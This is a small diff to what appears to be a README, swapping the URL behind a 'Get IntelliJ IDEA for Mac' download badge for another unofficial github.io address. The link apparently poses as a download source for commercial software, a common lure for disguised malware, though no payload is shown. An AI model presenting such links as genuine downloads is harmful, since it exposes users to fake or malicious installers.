@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://junimata-orex.github.io/.github/idea">  
+<a href="https://intellij-idea-macos.github.io/.github/idea">  
 <img src="https://img.shields.io/badge/💻_Get_IntelliJ_IDEA_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Get IntelliJ IDEA for Mac">  
 </a>  
 </div>  
